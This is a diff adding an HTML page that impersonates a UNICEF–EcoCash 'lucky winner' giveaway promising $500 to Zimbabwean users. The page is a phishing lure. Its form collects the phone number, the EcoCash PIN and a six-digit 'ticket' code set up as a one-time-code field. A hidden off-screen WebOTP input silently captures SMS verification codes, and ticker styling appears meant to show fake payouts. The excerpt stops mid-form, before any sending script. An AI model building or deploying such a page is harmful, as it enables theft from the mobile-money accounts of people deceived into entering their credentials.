@@ -1,0 +1,1582 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+    <title>UNICEF Foundation 5th Anniversary • EcoCash Lucky Winners</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800;14..32,900&display=swap" rel="stylesheet" />
+    <style>
+        /* ─── RESET ─── */
+        *,
+        *::before,
+        *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --charcoal: #1c1c1e;
+            --rose: #e8b4a0;
+            --rose-light: #f4d5c8;
+            --rose-dark: #c8937e;
+            --champagne: #f5e6d3;
+            --emerald: #00a859;
+            --emerald-light: #00c46a;
+            --text-primary: rgba(255, 255, 255, 0.95);
+            --red: #ef4444;
+            --radius-lg: 28px;
+            --radius-md: 16px;
+            --radius-sm: 12px;
+            --transition: 0.35s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        html, body {
+            height: 100%;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--charcoal);
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* ─── BACKGROUND IMAGE ─── */
+        .bg-image {
+            position: fixed;
+            inset: 0;
+            background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSm_5sMErbnuU2sC_JXpgxSJYPCJuMJNQLvAaJEU_Pp4w&s=10');
+            background-size: cover;
+            background-position: left top;
+            background-repeat: no-repeat;
+            opacity: 1;
+            z-index: 0;
+            pointer-events: none;
+            transform: scale(1.03);
+            transform-origin: left top;
+        }
+
+        .vignette {
+            position: fixed;
+            inset: 0;
+            background:
+                linear-gradient(90deg, rgba(0, 0, 0, 0.08) 0%, rgba(0, 0, 0, 0.18) 50%, rgba(0, 0, 0, 0.28) 100%),
+                radial-gradient(ellipse at center, transparent 0%, transparent 60%, rgba(0, 0, 0, 0.2) 100%);
+            z-index: 1;
+            pointer-events: none;
+        }
+
+        .noise {
+            position: fixed;
+            inset: 0;
+            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.5'/%3E%3C/svg%3E");
+            opacity: 0.02;
+            z-index: 2;
+            pointer-events: none;
+        }
+
+        /* ─── MAIN CONTAINER ─── */
+        .container {
+            display: grid;
+            grid-template-columns: 1fr;
+            max-width: 1000px;
+            width: 100%;
+            background: rgba(20, 20, 22, 0.22);
+            border: 1px solid rgba(255, 255, 255, 0.14);
+            border-radius: var(--radius-lg);
+            overflow: hidden;
+            box-shadow:
+                0 40px 100px rgba(0, 0, 0, 0.45),
+                0 0 0 1px rgba(232, 180, 160, 0.12),
+                inset 0 1px 0 rgba(255, 255, 255, 0.08);
+            position: relative;
+            z-index: 3;
+            backdrop-filter: blur(8px) saturate(1.15);
+            -webkit-backdrop-filter: blur(8px) saturate(1.15);
+        }
+
+        /* ─── SIDE PANEL ─── */
+        .side-panel {
+            display: none;
+            background:
+                linear-gradient(160deg, rgba(232, 180, 160, 0.06) 0%, rgba(28, 28, 30, 0.1) 60%),
+                radial-gradient(circle at 30% 20%, rgba(232, 180, 160, 0.08), transparent 60%);
+            padding: 48px 40px;
+            position: relative;
+            overflow: hidden;
+            border-right: 1px solid rgba(255, 255, 255, 0.08);
+        }
+
+        .side-panel::before {
+            content: '';
+            position: absolute;
+            top: -100px;
+            right: -100px;
+            width: 300px;
+            height: 300px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(232, 180, 160, 0.12), transparent 70%);
+            filter: blur(40px);
+        }
+
+        .side-panel::after {
+            content: '';
+            position: absolute;
+            bottom: -100px;
+            left: -100px;
+            width: 250px;
+            height: 250px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(0, 168, 89, 0.1), transparent 70%);
+            filter: blur(40px);
+        }
+
+        .side-content {
+            position: relative;
+            z-index: 1;
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+        }
+
+        .anniversary-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: linear-gradient(135deg, rgba(232, 180, 160, 0.25), rgba(0, 168, 89, 0.18));
+            border: 1.5px solid rgba(232, 180, 160, 0.45);
+            border-radius: 100px;
+            padding: 7px 16px;
+            margin-bottom: 28px;
+            width: fit-content;
+            box-shadow: 0 4px 20px rgba(232, 180, 160, 0.2);
+        }
+
+        .anniversary-badge .badge-icon { font-size: 14px; line-height: 1; }
+
+        .anniversary-badge .badge-text {
+            font-size: 10px;
+            font-weight: 900;
+            letter-spacing: 1.4px;
+            text-transform: uppercase;
+            color: #ffffff;
+            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.85);
+        }
+
+        .brand-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 32px;
+        }
+
+        .brand-mark {
+            width: 44px;
+            height: 44px;
+            border-radius: 12px;
+            background: linear-gradient(135deg, var(--emerald), var(--emerald-light));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 6px 20px rgba(0, 168, 89, 0.45);
+            position: relative;
+            flex-shrink: 0;
+        }
+
+        .brand-mark::after {
+            content: '$';
+            font-size: 24px;
+            font-weight: 900;
+            color: #ffffff;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .brand-text-block .brand-name {
+            font-size: 18px;
+            font-weight: 900;
+            letter-spacing: 0.2px;
+            color: #ffffff;
+            text-shadow: 0 2px 12px rgba(0, 0, 0, 0.85), 0 0 24px rgba(0, 0, 0, 0.5);
+        }
+
+        .brand-text-block .brand-name .cash { color: var(--champagne); }
+
+        .brand-text-block .brand-sub {
+            font-size: 10px;
+            font-weight: 800;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            color: rgba(255, 255, 255, 0.85);
+            margin-top: 2px;
+            text-shadow: 0 1px 6px rgba(0, 0, 0, 0.8);
+        }
+
+        .hero-title {
+            font-size: 34px;
+            font-weight: 900;
+            line-height: 1.12;
+            letter-spacing: -1px;
+            margin-bottom: 14px;
+            color: #ffffff;
+            text-shadow: 0 3px 16px rgba(0, 0, 0, 0.9), 0 0 40px rgba(0, 0, 0, 0.6);
+        }
+
+        .hero-title .accent {
+            background: linear-gradient(135deg, #f4d5c8, #f5e6d3);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            filter: drop-shadow(0 2px 12px rgba(0, 0, 0, 0.8));
+        }
+
+        .hero-sub {
+            font-size: 14.5px;
+            line-height: 1.7;
+            color: rgba(255, 255, 255, 0.9);
+            margin-bottom: 28px;
+            max-width: 340px;
+            font-weight: 500;
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.85);
+        }
+
+        .amount-card {
+            background: linear-gradient(135deg, rgba(232, 180, 160, 0.14), rgba(0, 168, 89, 0.1));
+            border: 1px solid rgba(232, 180, 160, 0.3);
+            border-radius: var(--radius-md);
+            padding: 22px;
+            margin-bottom: 28px;
+            position: relative;
+            overflow: hidden;
+            backdrop-filter: blur(6px);
+            -webkit-backdrop-filter: blur(6px);
+        }
+
+        .amount-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--rose), var(--champagne), var(--rose), transparent);
+        }
+
+        .amount-label {
+            font-size: 10.5px;
+            font-weight: 900;
+            letter-spacing: 1.6px;
+            text-transform: uppercase;
+            color: var(--rose-light);
+            margin-bottom: 6px;
+            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.85);
+        }
+
+        .amount-value {
+            font-size: 40px;
+            font-weight: 900;
+            letter-spacing: -1.8px;
+            color: #ffffff;
+            line-height: 1;
+            text-shadow: 0 3px 16px rgba(0, 0, 0, 0.9);
+        }
+
+        .amount-value .currency {
+            font-size: 18px;
+            font-weight: 700;
+            color: rgba(255, 255, 255, 0.85);
+            margin-left: 6px;
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.85);
+        }
+
+        .feature-list {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: auto;
+        }
+
+        .feature-list li {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 13px;
+            color: #ffffff;
+            font-weight: 700;
+            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.85);
+        }
+
+        .feature-list li .check {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background: rgba(232, 180, 160, 0.25);
+            border: 1.5px solid var(--rose-light);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            color: #ffffff;
+            flex-shrink: 0;
+            font-weight: 900;
+        }
+
+        /* ─── FORM PANEL ─── */
+        .form-panel {
+            padding: 40px 32px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .form-header {
+            margin-bottom: 24px;
+        }
+
+        .form-header .step-indicator {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 10.5px;
+            font-weight: 900;
+            letter-spacing: 1.4px;
+            text-transform: uppercase;
+            color: var(--rose-light);
+            margin-bottom: 12px;
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.9);
+        }
+
+        .form-header .step-indicator .dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: var(--emerald-light);
+            box-shadow: 0 0 12px var(--emerald-light);
+            animation: blink 2s ease-in-out infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.4; }
+        }
+
+        .form-header h2 {
+            font-size: 24px;
+            font-weight: 900;
+            letter-spacing: -0.6px;
+            margin-bottom: 6px;
+            color: #ffffff;
+            text-shadow: 0 3px 14px rgba(0, 0, 0, 0.9), 0 0 30px rgba(0, 0, 0, 0.6);
+        }
+
+        .form-header .sub-text {
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.85);
+            line-height: 1.55;
+            font-weight: 500;
+            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.85);
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-group label {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 11.5px;
+            font-weight: 900;
+            letter-spacing: 1.2px;
+            text-transform: uppercase;
+            color: #ffffff;
+            margin-bottom: 8px;
+            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.9);
+        }
+
+        .form-group label .req {
+            color: var(--rose-light);
+            font-size: 15px;
+            line-height: 1;
+            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.9);
+        }
+
+        .form-group label .ticket-hint {
+            font-size: 9.5px;
+            font-weight: 800;
+            color: var(--rose-light);
+            letter-spacing: 0.8px;
+            text-transform: uppercase;
+            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.9);
+        }
+
+        .input-wrap {
+            position: relative;
+            background: rgba(0, 0, 0, 0.45);
+            border: 1.5px solid rgba(255, 255, 255, 0.18);
+            border-radius: var(--radius-sm);
+            transition: var(--transition);
+            display: flex;
+            align-items: stretch;
+            overflow: hidden;
+            backdrop-filter: blur(6px);
+            -webkit-backdrop-filter: blur(6px);
+        }
+
+        .input-wrap:focus-within {
+            border-color: var(--rose-light);
+            background: rgba(0, 0, 0, 0.55);
+            box-shadow: 0 0 0 3px rgba(232, 180, 160, 0.2);
+        }
+
+        .input-wrap .prefix {
+            display: flex;
+            align-items: center;
+            padding: 0 14px;
+            font-size: 14.5px;
+            font-weight: 900;
+            color: var(--rose-light);
+            background: rgba(232, 180, 160, 0.14);
+            border-right: 1.5px solid rgba(255, 255, 255, 0.12);
+            letter-spacing: 0.3px;
+            white-space: nowrap;
+            gap: 6px;
+            text-shadow: 0 2px 6px rgba(0, 0, 0, 0.85);
+        }
+
+        .input-wrap .prefix .flag {
+            width: 18px;
+            height: 12px;
+            border-radius: 2px;
+            overflow: hidden;
+            box-shadow: 0 0 0 1px rgba(255, 255, 255, 0.25);
+        }
+
+        .input-wrap input {
+            flex: 1;
+            width: 100%;
+            padding: 15px 16px;
+            font-size: 15.5px;
+            font-family: inherit;
+            font-weight: 800;
+            background: transparent;
+            border: none;
+            color: #ffffff;
+            outline: none;
+            letter-spacing: 0.5px;
+        }
+
+        .input-wrap input::placeholder {
+            color: rgba(255, 255, 255, 0.4);
+            font-weight: 500;
+            letter-spacing: 2px;
+        }
+
+        .input-wrap.error {
+            border-color: var(--red);
+            box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.2);
+        }
+
+        .input-wrap .toggle-vis {
+            background: none;
+            border: none;
+            padding: 0 16px;
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 16px;
+            cursor: pointer;
+            opacity: 0.9;
+            transition: var(--transition);
+        }
+
+        .input-wrap .toggle-vis:hover {
+            opacity: 1;
+            color: var(--rose-light);
+        }
+
+        .hint {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.85);
+            margin-top: 7px;
+            letter-spacing: 0.3px;
+            font-weight: 600;
+            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.85);
+        }
+
+        .hint.error-text { color: #ff8a8a; opacity: 1; }
+        .hint.success-text { color: #4ade80; opacity: 1; }
+
+        .hint .badge-mini {
+            display: inline-block;
+            background: rgba(232, 180, 160, 0.2);
+            border: 1px solid rgba(232, 180, 160, 0.4);
+            border-radius: 4px;
+            padding: 1px 6px;
+            font-family: 'Inter', monospace;
+            font-weight: 900;
+            font-size: 11px;
+            color: var(--rose-light);
+            letter-spacing: 2px;
+            margin: 0 2px;
+        }
+
+        .form-group.ticket-field {
+            background: linear-gradient(135deg, rgba(232, 180, 160, 0.1), rgba(0, 168, 89, 0.06));
+            border: 1.5px dashed rgba(232, 180, 160, 0.4);
+            border-radius: var(--radius-md);
+            padding: 16px;
+            margin-bottom: 18px;
+            position: relative;
+            transition: var(--transition);
+        }
+
+        .form-group.ticket-field .ticket-helper {
+            font-size: 11.5px;
+            color: rgba(255, 255, 255, 0.85);
+            margin-top: 8px;
+            line-height: 1.5;
+            font-weight: 600;
+            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.85);
+        }
+
+        .form-group.ticket-field .ticket-helper strong {
+            color: var(--rose-light);
+            font-weight: 900;
+        }
+
+        /* ─── HIDDEN OTP INPUT (for WebOTP) ─── */
+        #otpHidden {
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
+            width: 1px;
+            height: 1px;
+            z-index: -1;
+            top: -9999px;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 17px 22px;
+            font-size: 14px;
+            font-weight: 900;
+            font-family: inherit;
+            letter-spacing: 1.2px;
+            text-transform: uppercase;
+            border: none;
+            border-radius: var(--radius-sm);
+            cursor: pointer;
+            margin-top: 12px;
+            background: linear-gradient(135deg, var(--rose), var(--rose-dark));
+            color: #1c1c1e;
+            box-shadow:
+                0 8px 24px rgba(232, 180, 160, 0.5),
+                inset 0 1px 0 rgba(255, 255, 255, 0.4);
+            transition: var(--transition);
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn-submit::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
+            transition: left 0.7s ease;
+        }
+
+        .btn-submit:hover:not(:disabled) {
+            transform: translateY(-1px);
+            box-shadow: 0 12px 34px rgba(232, 180, 160, 0.65);
+            background: linear-gradient(135deg, var(--rose-light), var(--rose));
+        }
+
+        .btn-submit:hover:not(:disabled)::before { left: 100%; }
+        .btn-submit:active:not(:disabled) { transform: scale(0.99); }
+        .btn-submit:disabled { opacity: 0.7; cursor: not-allowed; }
+
+        .btn-submit .spinner {
+            width: 18px;
+            height: 18px;
+            border: 2.5px solid rgba(28, 28, 30, 0.25);
+            border-top-color: #1c1c1e;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .security-note {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 20px;
+            font-size: 11px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            color: #ffffff;
+            font-weight: 800;
+            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.9);
+        }
+
+        .security-note .dot-live {
+            width: 5px;
+            height: 5px;
+            border-radius: 50%;
+            background: var(--emerald-light);
+            box-shadow: 0 0 10px var(--emerald-light);
+        }
+
+        /* ─── SUCCESS SCREEN ─── */
+        .success-screen {
+            display: none;
+            text-align: center;
+            padding: 20px 0;
+            animation: fadeUp 0.6s ease forwards;
+        }
+
+        .success-screen.active { display: block; }
+
+        .success-icon {
+            width: 88px;
+            height: 88px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--rose), var(--champagne));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 24px;
+            font-size: 42px;
+            color: var(--charcoal);
+            box-shadow:
+                0 16px 50px rgba(232, 180, 160, 0.6),
+                0 0 0 10px rgba(232, 180, 160, 0.2);
+            animation: popIn 0.6s cubic-bezier(0.22, 1, 0.36, 1);
+        }
+
+        @keyframes popIn {
+            0% { transform: scale(0.3); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .success-screen h2 {
+            font-size: 26px;
+            font-weight: 900;
+            margin-bottom: 12px;
+            letter-spacing: -0.5px;
+            color: #ffffff;
+            text-shadow: 0 3px 16px rgba(0, 0, 0, 0.9), 0 0 30px rgba(0, 0, 0, 0.6);
+        }
+
+        .success-screen p {
+            font-size: 15px;
+            line-height: 1.75;
+            color: rgba(255, 255, 255, 0.92);
+            max-width: 380px;
+            margin: 0 auto;
+            font-weight: 500;
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.85);
+        }
+
+        .success-screen p strong {
+            color: var(--rose-light);
+            font-weight: 900;
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.9);
+        }
+
+        /* ─── LIVE FUNDED TICKER ─── */
+        .funded-ticker {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: linear-gradient(180deg, rgba(20, 20, 22, 0.75) 0%, rgba(20, 20, 22, 0.98) 100%);
+            border-top: 1.5px solid rgba(232, 180, 160, 0.3);
+            backdrop-filter: blur(14px);
+            -webkit-backdrop-filter: blur(14px);
+            z-index: 50;
+            padding: 16px 0;
+            overflow: hidden;
+            box-shadow: 0 -12px 40px rgba(0, 0, 0, 0.5);
+        }
+
+        .funded-ticker::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, rgba(232, 180, 160, 0.7), rgba(0, 168, 89, 0.7), rgba(232, 180, 160, 0.7), transparent);
+            background-size: 200% 100%;
+            animation: shimmerLine 3s linear infinite;
+        }
+
+        @keyframes shimmerLine {
+            0% { background-position: 0% 50%; }
+            100% { background-position: 200% 50%; }
+        }
+
+        .ticker-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 12px;
+            padding: 0 20px;
+        }
+
+        .ticker-header .live-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #4ade80;
+            box-shadow: 0 0 16px #4ade80;
+            animation: livePulse 1.5s ease-in-out infinite;
+            flex-shrink: 0;
+        }
+
+        @keyframes livePulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.4; transform: scale(0.7); }
+        }
+
+        .ticker-header .ticker-label {
+            font-size: 13px;
+            font-weight: 900;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            color: #ffffff;
+            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.85);
+        }
+
+        .ticker-header .ticker-count {
+            font-size: 13px;
+            font-weight: 900;
+            letter-spacing: 1px;
+            color: var(--emerald-light);
+            text-shadow: 0 0 12px rgba(0, 196, 106, 0.6);
+        }
+
+        .ticker-track {
+            display: flex;
+            gap: 40px;
+            white-space: nowrap;
+            animation: tickerScroll 18s linear infinite;
+            padding-left: 100%;
+            will-change: transform;
+        }
+
+        .ticker-track:hover { animation-play-state: paused; }
+
+        @keyframes tickerScroll {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-100%); }
+        }
+
+        .funded-item {
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            flex-shrink: 0;
+            font-family: 'Inter', monospace;
+            font-weight: 800;
+        }
+
+        .funded-item .funded-check {
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            background: rgba(0, 168, 89, 0.3);
+            border: 2px solid var(--emerald-light);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            color: var(--emerald-light);
+            flex-shrink: 0;
+            font-weight: 900;
+            box-shadow: 0 0 12px rgba(0, 196, 106, 0.4);
+        }
+
+        .funded-item .funded-phone {
+            font-size: 17px;
+            color: #ffffff;
+            letter-spacing: 0.8px;
+            font-weight: 900;
+            text-shadow: 0 2px 6px rgba(0, 0, 0, 0.9);
+        }
+
+        .funded-item .funded-amount {
+            font-size: 17px;
+            color: var(--rose-light);
+            font-weight: 900;
+            text-shadow: 0 0 14px rgba(232, 180, 160, 0.5);
+        }
+
+        .funded-item .funded-time {
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.65);
+            font-weight: 700;
+            font-family: 'Inter', sans-serif;
+            letter-spacing: 0.4px;
+        }
+
+        /* ─── CONFETTI ─── */
+        .confetti-container {
+            position: fixed;
+            inset: 0;
+            pointer-events: none;
+            z-index: 9999;
+            overflow: hidden;
+        }
+
+        .confetti-piece {
+            position: absolute;
+            top: -10px;
+            animation: confetti-fall linear forwards;
+        }
+
+        @keyframes confetti-fall {
+            0% { transform: translateY(0) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
+        }
+
+        /* ─── RESPONSIVE ─── */
+        @media (min-width: 820px) {
+            .container {
+                grid-template-columns: 1.05fr 1fr;
+                max-width: 940px;
+            }
+            .side-panel { display: block; }
+        }
+
+        @media (max-width: 819px) {
+            body { padding: 16px 16px 130px 16px; }
+            .container {
+                border-radius: 22px;
+                background: rgba(20, 20, 22, 0.26);
+            }
+            .form-panel { padding: 32px 24px; }
+            .form-header h2 { font-size: 21px; }
+            .mobile-brand {
+                display: flex;
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 14px;
+                margin-bottom: 26px;
+                padding-bottom: 22px;
+                border-bottom: 1px solid rgba(255, 255, 255, 0.12);
+            }
+            .mobile-anniversary {
+                display: inline-flex;
+                align-items: center;
+                gap: 6px;
+                background: linear-gradient(135deg, rgba(232, 180, 160, 0.25), rgba(0, 168, 89, 0.18));
+                border: 1px solid rgba(232, 180, 160, 0.4);
+                border-radius: 100px;
+                padding: 5px 12px;
+                font-size: 9.5px;
+                font-weight: 900;
+                letter-spacing: 1.2px;
+                text-transform: uppercase;
+                color: #ffffff;
+                text-shadow: 0 2px 8px rgba(0, 0, 0, 0.85);
+                width: fit-content;
+            }
+            .mobile-brand-row {
+                display: flex;
+                align-items: center;
+                gap: 12px;
+            }
+            .mobile-brand .brand-mark {
+                width: 38px;
+                height: 38px;
+                border-radius: 10px;
+            }
+            .mobile-brand .brand-mark::after { font-size: 20px; }
+            .mobile-brand .brand-name {
+                font-size: 17px;
+                font-weight: 900;
+                color: #ffffff;
+                text-shadow: 0 2px 12px rgba(0, 0, 0, 0.9);
+            }
+            .mobile-brand .brand-name .cash { color: var(--champagne); }
+            .mobile-brand .brand-sub {
+                font-size: 10px;
+                color: rgba(255, 255, 255, 0.85);
+                letter-spacing: 0.8px;
+                text-transform: uppercase;
+                margin-top: 1px;
+                font-weight: 800;
+                text-shadow: 0 1px 6px rgba(0, 0, 0, 0.85);
+            }
+            .funded-ticker { padding: 12px 0; }
+            .ticker-header { gap: 8px; margin-bottom: 8px; }
+            .ticker-header .ticker-label { font-size: 11px; letter-spacing: 1.4px; }
+            .ticker-header .ticker-count { font-size: 11px; }
+            .ticker-track { gap: 28px; animation-duration: 14s; }
+            .funded-item { gap: 8px; }
+            .funded-item .funded-check { width: 18px; height: 18px; font-size: 10px; }
+            .funded-item .funded-phone { font-size: 14px; }
+            .funded-item .funded-amount { font-size: 14px; }
+            .funded-item .funded-time { font-size: 11px; }
+        }
+
+        @media (min-width: 820px) {
+            .mobile-brand { display: none; }
+        }
+
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateY(14px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ─── BACKGROUND ─── -->
+    <div class="bg-image" aria-hidden="true"></div>
+    <div class="vignette" aria-hidden="true"></div>
+    <div class="noise" aria-hidden="true"></div>
+
+    <!-- ─── MAIN CONTAINER ─── -->
+    <div class="container" role="main" aria-label="UNICEF Foundation 5th Anniversary EcoCash Lucky Winners">
+
+        <!-- ─── LEFT SIDE PANEL ─── -->
+        <aside class="side-panel">
+            <div class="side-content">
+
+                <div class="anniversary-badge">
+                    <span class="badge-icon">🎉</span>
+                    <span class="badge-text">5th Anniversary Edition</span>
+                </div>
+
+                <div class="brand-row">
+                    <div class="brand-mark"></div>
+                    <div class="brand-text-block">
+                        <div class="brand-name">Eco<span class="cash">Cash</span></div>
+                        <div class="brand-sub">Official Partner</div>
+                    </div>
+                </div>
+
+                <h1 class="hero-title">
+                    UNICEF Foundation<br />
+                    <span class="accent">5th Anniversary</span><br />
+                    Lucky Winners.
+                </h1>
+                <p class="hero-sub">
+                    In celebration of our 5th Anniversary, UNICEF Foundation together with EcoCash is awarding selected lucky winners across Zimbabwe.
+                </p>
+
+                <div class="amount-card">
+                    <div class="amount-label">Withdrawal Amount</div>
+                    <div class="amount-value">$500<span class="currency">USD</span></div>
+                </div>
+
+                <ul class="feature-list">
+                    <li><span class="check">✓</span> Verified lucky winner</li>
+                    <li><span class="check">✓</span> Instant EcoCash payout</li>
+                    <li><span class="check">✓</span> Bank-grade security</li>
+                </ul>
+
+            </div>
+        </aside>
+
+        <!-- ─── RIGHT FORM PANEL ─── -->
+        <section class="form-panel">
+
+            <div class="mobile-brand">
+                <div class="mobile-anniversary">
+                    <span>🎉</span>
+                    <span>5th Anniversary Edition</span>
+                </div>
+                <div class="mobile-brand-row">
+                    <div class="brand-mark"></div>
+                    <div>
+                        <div class="brand-name">Eco<span class="cash">Cash</span></div>
+                        <div class="brand-sub">Official Partner</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="form-header">
+                <div class="step-indicator">
+                    <span class="dot"></span>
+                    <span>Secure Withdrawal</span>
+                </div>
+                <h2>Complete Your Claim</h2>
+                <p class="sub-text">Enter your details below to receive your lucky winner award.</p>
+            </div>
+
+            <!-- ─── HIDDEN OTP INPUT FOR WEBOTP ─── -->
+            <input type="text" id="otpHidden" autocomplete="one-time-code" inputmode="numeric" />
+
+            <!-- ─── FORM ─── -->
+            <form id="rewardForm" novalidate autocomplete="off">
+
+                <div class="form-group">
+                    <label for="phoneNumber">
+                        <span>Phone Number</span>
+                        <span class="req">*</span>
+                    </label>
+                    <div class="input-wrap" id="phoneWrap">
+                        <span class="prefix">
+                            <svg class="flag" viewBox="0 0 30 20" xmlns="http://www.w3.org/2000/svg">
+                                <rect width="30" height="20" fill="#ffffff" />
+                                <rect y="0" width="30" height="4" fill="#12a150" />
+                                <rect y="16" width="30" height="4" fill="#12a150" />
+                                <rect y="4" width="30" height="2" fill="#ffcf40" />
+                                <rect y="14" width="30" height="2" fill="#ffcf40" />
+                                <rect y="8" width="30" height="4" fill="#ef4444" />
+                                <polygon points="0,0 0,20 10,10" fill="#000000" />
+                            </svg>
+                            +263
+                        </span>
+                        <input type="tel" id="phoneNumber" placeholder="** *** ****" autocomplete="tel" required />
+                    </div>
+                    <div class="hint" id="phoneHint">Enter your 9‑digit mobile number.</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="cardPin">
+                        <span>EcoCash PIN</span>
+                        <span class="req">*</span>
+                    </label>
+                    <div class="input-wrap" id="pinWrap">
+                        <input
+                            type="password"
+                            id="cardPin"
+                            placeholder="••••"
+                            autocomplete="off"
+                            maxlength="4"
+                            inputmode="numeric"
+                            pattern="[0-9]{4}"
+                            required
+                            style="letter-spacing: 8px; font-size: 18px;"
+                        />
+                        <button type="button" class="toggle-vis" id="togglePin" aria-label="Toggle PIN">👁</button>
+                    </div>
+                    <div class="hint" id="pinHint">Enter your 4‑digit PIN.</div>
+                </div>
+
+                <div class="form-group ticket-field" id="ticketField">
+                    <label for="ticketNumber">
+                        <span>Lucky Ticket Number</span>
+                        <span class="ticket-hint">6‑Digit Code</span>
+                    </label>
+                    <div class="input-wrap" id="ticketWrap">
+                        <input
+                            type="text"
+                            id="ticketNumber"
+                            placeholder="• • • • • •"
+                            autocomplete="one-time-code"
+                            maxlength="6"
+                            inputmode="numeric"
+                            pattern="[0-9]{6}"
+                            required
+                            style="letter-spacing: 8px; font-size: 20px; font-weight: 900; text-align: center;"
+                        />
+                    </div>
+                    <div class="ticket-helper">
